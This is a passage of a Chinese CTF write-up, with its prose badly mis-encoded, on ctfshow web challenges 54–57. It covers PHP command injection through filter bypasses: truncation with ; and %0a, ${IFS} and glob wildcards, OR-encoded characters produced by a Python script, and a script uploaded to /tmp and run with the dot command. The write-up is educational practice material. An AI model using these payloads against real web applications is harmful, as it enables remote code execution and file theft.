&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment"># é¢˜ç›®çš„æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">            pattern = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">            <span class="comment"># å¦‚æœå½“å‰å¤–å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥è·³è¿‡æ‰€æœ‰å†…å±‚å¾ªç¯</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(i)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># å¦‚æœå½“å‰å†…å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œè·³è¿‡è¯¥å…ƒç´ </span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(j)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># [2:]æ˜¯å› ä¸ºpythonä¸­hexè¡¨ç¤ºæ˜¯0xffè¿™æ ·çš„å½¢å¼ï¼Œå»æ‰å‰é¢çš„0xï¼Œç»„æˆ2ä½urlç¼–ç </span></span><br><span class="line">            hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="comment"># urlç¼–ç çš„æ–¹å¼å’ŒASCIIç ä¸€æ ·ï¼Œä½†éœ€è¦åœ¨å‰é¢åŠ ä¸Š%</span></span><br><span class="line">            url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">            url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">            <span class="comment"># cæ˜¯æˆ‘ä»¬è¦æ„é€ çš„å‚æ•°ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦ä¼ lså‘½ä»¤ï¼Œlå°±è¦æ‹†åˆ†æˆa|bï¼Œå…¶ä¸­|æ˜¯å› ä¸ºé¢˜ç›®æ²¡æœ‰è¿‡æ»¤|ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆå…¶ä»–ä»»æ„æ“ä½œ</span></span><br><span class="line">            c = <span class="built_in">ord</span>(urllib.parse.unquote(url_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(url_j))</span><br><span class="line">            <span class="comment"># å¦‚æœcæ˜¯å¯è§çš„å­—ç¬¦</span></span><br><span class="line">            <span class="keyword">if</span> c &gt;=<span class="number">32</span> <span class="keyword">and</span> c&lt;=<span class="number">126</span>:</span><br><span class="line">                f.write(<span class="built_in">chr</span>(c)+<span class="string">&quot; &quot;</span>+url_i+<span class="string">&quot; &quot;</span>+url_j+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥<code>python exp.py http://403c8935-1b28-4410-8d96-512661e9649f.challenge.ctf.show/</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] your functionï¼šsystem</span><br><span class="line">[+] your commandï¼šcat flag.php</span><br></pre></td></tr></table></figure><p>å³å¯è·å–flag</p><p><a href="https://blog.csdn.net/qq_40345591/article/details/127773706">ä»£ç è§£æ</a>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ChatGPTä¸ºæˆ‘ä»¬åˆ†æä»£ç ï¼Œç„¶ådebugçœ‹çœ‹æ€ä¹ˆè¿è¡Œçš„ã€‚</p><h4><span id="å‘½ä»¤æˆªæ–­">å‘½ä»¤æˆªæ–­</span></h4><p>æˆ‘ä»¬çœ‹ä¸€çœ¼é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ„æ€æ˜¯å°†å‘½ä»¤å…¨è¾“å‡ºåˆ°**&#x2F;dev&#x2F;null**ä¸­ï¼ŒåŒæ—¶é”™è¯¯ä¿¡æ¯æµä¹Ÿä¼šè¢«é‡å®šå‘åˆ°æ­£ç¡®ä¿¡æ¯æµä¸­ã€‚</p><ul><li><strong>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong><ol><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</li><li>â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol></li></ul><p>è¿™é“é¢˜ä¸­æˆ‘ä»¬å¯ä»¥ç”¨&amp;&amp;æ‹¼æ¥ï¼Œç„¶åè®©åé¢æ‰§è¡Œçš„å‘½ä»¤é‡å®šå‘åˆ°**&#x2F;dev&#x2F;null**ä¸­å³å¯</p><ul><li>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æˆªæ–­çš„æ–¹æ³•ï¼Œè®©åé¢é‡å®šå‘ä¸èµ·ä½œç”¨<ul><li>æˆªæ–­æ–¹æ³•<code> ; , &amp;&amp; , %0aï¼Œ||</code>ç­‰ç­‰ï¼Œæœ‰å¾ˆå¤šæˆªæ–­æ–¹æ³•</li></ul></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># éœ€è¦urlç¼–ç </span><br><span class="line">/?c=ls&amp;&amp;ls</span><br><span class="line">?c=ls;</span><br><span class="line">?c=ls%<span class="number">0</span>a</span><br><span class="line">?c=tac flag.php;</span><br><span class="line">/?c=ta\c&lt;&gt;fla\g.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><h4><span id="web54">web54</span></h4><ul><li><p>æ–¹æ³•ä¸€</p><ul><li><p>å±è”½äº†å¤§å¤šæ•°linuxå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨rev</p><p><code>/?c=rev$&#123;IFS&#125;fla?.php</code></p></li></ul></li><li><p>æ–¹æ³•äºŒ</p><ul><li><p>è™½ç„¶å±è”½äº†å¾ˆå¤šå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€åœ¨binç›®å½•è®©å‘½ä»¤è¡¥å…¨å°±å¯ä»¥äº†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/?<span class="built_in">at</span>$&#123;IFS&#125;f???????</span><br><span class="line">/bin/c??$&#123;IFS&#125;????????</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ–¹æ³•ä¸‰</p><ul><li>ä¿®æ”¹flagçš„åå­—ï¼Œç„¶åç›´æ¥è®¿é—®ç½‘é¡µ</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;t.txt</span><br><span class="line">t.txt</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web55">web55</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€</p><ul><li><p>è¿™é¢˜ç¦ç”¨äº† å­—æ¯ a-z ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ç”¨ &#x2F;bin&#x2F;base64 flag.php</p><p>åŠ ä¸Šé€šé…ç¬¦ åˆ™ä¸º &#x2F;???&#x2F;????64 ????.??? ç„¶åä»–å°±ä¼šå‡ºç° flag.phpå†…å®¹çš„<a href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">base64ç¼–ç </a></p></li></ul></li><li><p>æ–¹æ³•äºŒï¼š</p><ul><li><p>è¿˜æœ‰ä¸€ç§åšæ³•ï¼Œå°±æ˜¯ä½¿ç”¨ &#x2F;usr&#x2F;bin&#x2F;bzip2 è¿›è¡Œå¯¹æ–‡ä»¶çš„å‹ç¼©</p><p>åŒæ ·æ˜¯ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>ï¼Œ ç„¶å æœ€åè®¿é—® &#x2F;flag.php.bz2è¿›è¡Œä¸‹è½½å‹ç¼©åŒ…</p><p><code>?c=/???/???/????2%20????.???</code></p></li></ul></li><li><p>æ–¹æ³•ä¸‰ï¼š</p><p>å‰ææ˜¯ é¢˜ç›®æ²¡æœ‰è¿‡æ»¤ ? &#x2F; . (é—®å·ï¼Œæ–œæ ,ç‚¹)ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshell</a></p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="globé€šé…ç¬¦"></p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTæ•°æ®åŒ…POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://43546a81-d8c7-4242-a8ea-dde142ff1d80.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è®¿é—®å¹¶<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>ï¼Œä¸Šä¼ 1.php å†™å…¥</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/c51ed151f2784287b539732dd5ff2699.png" alt="burpsuit"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /?c=.%<span class="number">20</span>/???/????????[@-[] HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>fcec0ba-d4db-<span class="number">470</span>e-b611-<span class="number">1</span>f5455fea91c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">319</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;.Not/A)Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;103&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;103&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaq9iIs9BT90tIPe6</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line"><span class="comment">cat flag.php.bz2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line">cat  /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"><span class="comment"># å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç›®å½•æ˜¯&#x2F;tmpï¼Œç„¶åä¸€èˆ¬ç½‘é¡µæ–‡ä»¶ä¼šå‘½åä¸ºphp??????ï¼Œåé¢æ˜¯éšæœºçš„å­—æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è§„å®šä¸€ä¸ªèŒƒå›´[@-[],ä»@-[å°±æ˜¯26ä¸ªå­—æ¯</p><p>ç„¶åå…³äºä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ã€‚æ—¢ç„¶è¦è®©æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶èƒ½æ‰§è¡Œæˆ‘ä»¬çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ å†…å®¹&#x2F;bin&#x2F;sh</p><p>å› ä¸ºlinuxç³»ç»Ÿä¸‹ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸€äº›ä¸ªå†…ç½®ç¨‹åºéƒ½æ˜¯ç”±æ–‡ä»¶ç»„æˆçš„ã€‚</p><p>&#x2F;binç›®å½•ä¸‹å­˜æ”¾çš„éƒ½æ˜¯åè®®shellè„šæœ¬çš„å†…å®¹ï¼Œshå°±æ˜¯æ‰§è¡Œshellè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ‰“å¼€ç»ˆç«¯ã€‚åªæœ‰æ‰“å¼€ç»ˆç«¯æˆ‘ä»¬å†èƒ½è¾“å…¥å‘½ä»¤å¯¹å§</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨æ–‡ä»¶é‡Œé¢åœ¨æ·»åŠ ls,catç­‰ä¸€ç³»åˆ—è¯»å–æ–‡ä»¶çš„å‘½ä»¤äº†ã€‚</p><p>é‚£ä¹ˆè¿˜å·®æœ€åä¸€æ­¥ã€‚æˆ‘ä»¬ä¸Šä¼ äº†è¿™ä¸ªæ–‡ä»¶åé‚£ä¹ˆå®ƒæ˜¯å­˜æ”¾åœ¨&#x2F;tmpç›®å½•ä¸‹çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å®ƒåªæ˜¯å­˜æ”¾åœ¨äº†é‚£é‡Œï¼Œå¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥æ—¶å€™ç‚¹å‘½ä»¤ï¼Œè€Œæ­£å¥½é¢˜ç›®å¹¶æ²¡æœ‰è¿‡æ»¤ç‚¹å‘½ä»¤ï¼Œç‚¹å‘½ä»¤å°±æ˜¯æ‰§è¡Œshellè„šæœ¬</p><p>æ‰€ä»¥æˆ‘ä»¬æŠ“åŒ…ï¼Œç„¶åæ„é€ </p><p><strong>æœ‰æ¦‚ç‡å¤±è´¥ï¼Œå¤±è´¥é‡è¯•å³å¯ï¼Œå› ä¸ºæœ€åä¸€ä¸ªå­—æ¯ä¸ä¸€å®šæ˜¯å¤§å†™çš„ï¼Œè®°å¾—ä¿®æ”¹å³ä¸Šè§’çš„portä¸º80ï¼Œç„¶åhttpså…³äº†</strong></p><h4><span id="web57">web57</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬flagå†36.phpæ–‡ä»¶é‡Œé¢ï¼Œå¹¶ä¸”systemå‡½æ•°å·²ç»åŒ…å«äº†catå’Œphp</p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬ä¼ å‚ä¸€ä¸ª36å°±å¯ä»¥ </p><p>ä½†æ˜¯æ•°å­—è¢«è¿‡æ»¤æ‰äº†</p><p>è¿™æ—¶å€™å°±è¦ç”¨åˆ°ä¸€ä¸ªlinuxé‡Œé¢çš„å…³äº$çš„ç‰¹æ€§</p><p>$(())ä»£è¡¨ç®—æ•°è¿ç®—ï¼Œä¸¾ä¸ªæ —å­ï¼ša&#x3D;1,b&#x3D;2</p><p>$a+$bå°±ç­‰åŒäº$((1+2))</p><p>ç„¶åå› ä¸ºé¢˜ç›®æ— æ³•ä¼ 